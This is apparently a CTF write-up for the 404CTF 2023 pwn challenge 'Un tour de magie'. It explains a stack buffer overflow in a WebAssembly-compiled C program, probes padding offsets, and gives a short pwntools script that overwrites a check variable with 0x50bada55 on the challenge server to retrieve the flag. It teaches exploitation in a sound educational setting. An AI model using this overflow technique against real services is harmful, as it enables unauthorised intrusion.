---
title: CTFs | 404CTF_2023 | Pwn | Un tour de magie
author: BatBato
date: 2023-06-08
categories: [CTFs, 404CTF_2023, Pwn]
tags: [Pwn, Stack, Heap]
permalink: /CTFs/404CTF_2023/Pwn/Un_tour_de_magie
---

# Un tour de magie

![image](https://github.com/Nouman404/nouman404.github.io/assets/73934639/bfc3ecc5-ed76-46fe-8249-30142939e53b)

In this challenge, we are given [this](https://github.com/Nouman404/nouman404.github.io/blob/main/_posts/CTFs/404CTF_2023/Pwn/tour-de-magie.zip) zip file containing the source code and the compiled code. 

The compiled code is a `WASM` file. `WASM` stands for` WebAssembly`, which is a binary instruction format designed for the web. `WebAssembly` is a low-level virtual machine that is designed to run efficiently on web browsers and provides a portable execution environment for web applications. It allows developers to write code in languages such as `C`, `C++`, and `Rust` and compile them into `WebAssembly`, which can then be executed in a web browser alongside JavaScript.


As we can see in the main source code, we have an `input` variable that is of length `20`, but then the `fgets` take an input of `200`... There should be a possibility of buffer overflow here...

We can first try to run with 21 `A`s, but we get the following error:

![image](https://github.com/Nouman404/nouman404.github.io/assets/73934639/72f67c7e-c95a-41d0-a3f4-562a5c572234)

This is because we didn't change the value of `check`:

![image](https://github.com/Nouman404/nouman404.github.io/assets/73934639/e47893a5-f280-4440-9878-d404f224b2fd)

We can try to add more characters, and when we get to `23`, we get the result:

![image](https://github.com/Nouman404/nouman404.github.io/assets/73934639/d7c28ede-650d-4733-a857-daa3eff8fa78)

Which comes from:

![image](https://github.com/Nouman404/nouman404.github.io/assets/73934639/ceb521c7-8728-496f-b2d3-1f1fd6504405)

Now that we managed to modify the address of check, we need to modify it to `0x50bada55` to be able to get the flag. So let's try to put 19 `A`s and 4 `B`s where the `B`s are representing the address of `check` that we need to override:

![image](https://github.com/Nouman404/nouman404.github.io/assets/73934639/e14a1a84-2a66-46b8-8432-701dde962361)

As we can see, we don't have all the `B`s (42) at the end. So let's put 18 `A`s, 4 `B`s and 1 `C`:

![image](https://github.com/Nouman404/nouman404.github.io/assets/73934639/91527337-5826-4770-b83b-caaaff67d889)


As we can see, we have two `B`s instead of one. We do the same thing until we get to 16 `A`s, 4 `B` and 3 `C`s:

![image](https://github.com/Nouman404/nouman404.github.io/assets/73934639/904e4288-dff6-4249-933e-f4f7883cec6f)


And now we have all the `B`s. We can now use the following code to do the same thing but automatically and send the payload to the netcat server!

```python
from pwn import *

# Establish the connection to the vulnerable C program
#io = process(['./wasmtime', 'main.wasm'])

io = remote("challenges.404ctf.fr", 30274)

# Craft the payload to set *check to 0x50bada55
payload = b'A' * 16  + p32(0x50bada55) + b"C" *3

print(io.recvline())
# Send the payload to the program
io.sendline(payload)

# Receive and print the program's output
output = io.recvline()
print(output)

if (b"Apparemment non" not in output):
	output = io.recvall()
	print("Flag :", output.decode())

# Close the connection
io.close()
```

We get the following result:

![image](https://github.com/Nouman404/nouman404.github.io/assets/73934639/064c3cc4-b342-4e75-87b3-ca65cce2935c)

The flag is `404CTF{W0w_St4Ck_3cR4s3_l4_H34P_Qu3LL3_M4G13}`
